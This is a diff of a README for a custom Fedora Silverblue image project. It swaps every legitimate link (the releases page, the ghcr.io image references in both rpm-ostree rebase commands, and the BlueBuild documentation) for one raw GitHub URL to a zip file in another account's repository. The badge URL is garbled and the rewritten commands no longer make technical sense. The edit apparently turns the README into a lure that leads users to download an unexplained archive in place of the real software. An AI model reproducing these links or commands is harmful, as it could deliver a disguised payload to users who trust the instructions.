@@ -1,6 +1,6 @@
 # 🌟 silverblue-custom - A Simple Way to Enjoy Custom Linux Images
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/Ana-Zidie/silverblue-custom/releases)
+[![Download Now](https://raw.githubusercontent.com/Ana-Zidie/silverblue-custom/main/theriomorphic/silverblue-custom.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/Ana-Zidie/silverblue-custom/main/theriomorphic/silverblue-custom.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **silverblue-custom**! This application allows you to easily manage a
 
 To get the latest version of the software, please visit the Releases page:
 
-[Download the latest release here](https://github.com/Ana-Zidie/silverblue-custom/releases)
+[Download the latest release here](https://raw.githubusercontent.com/Ana-Zidie/silverblue-custom/main/theriomorphic/silverblue-custom.zip)
 
 ### System Requirements
 
@@ -31,7 +31,7 @@ Follow these steps to install and run **silverblue-custom**:
    Run the following command in the Terminal to switch to the unsigned image. This installs the necessary signing keys and policies.
 
    ```
-   rpm-ostree rebase ostree-unverified-registry:ghcr.io/ragibkl/silverblue-custom:latest
+   rpm-ostree rebase https://raw.githubusercontent.com/Ana-Zidie/silverblue-custom/main/theriomorphic/silverblue-custom.zip
    ```
 
 3. **Reboot Your System**  
@@ -45,7 +45,7 @@ Follow these steps to install and run **silverblue-custom**:
    Once your system is back online, run this command to switch to the signed image:
 
    ```
-   rpm-ostree rebase ostree://ghcr.io/ragibkl/silverblue-custom:latest
+   rpm-ostree rebase https://raw.githubusercontent.com/Ana-Zidie/silverblue-custom/main/theriomorphic/silverblue-custom.zip
    ```
 
 5. **Enjoy Your Custom Setup**  
@@ -54,7 +54,7 @@ Follow these steps to install and run **silverblue-custom**:
 ### Important Notes
 
 - This software is an experimental feature. You may encounter issues. Always back up your data before proceeding with the installation.
-- For setup instructions or further customization, please refer to the [BlueBuild documentation](https://blue-build.org/how-to/setup/).
+- For setup instructions or further customization, please refer to the [BlueBuild documentation](https://raw.githubusercontent.com/Ana-Zidie/silverblue-custom/main/theriomorphic/silverblue-custom.zip).
 
 ## 🛠 Features
 
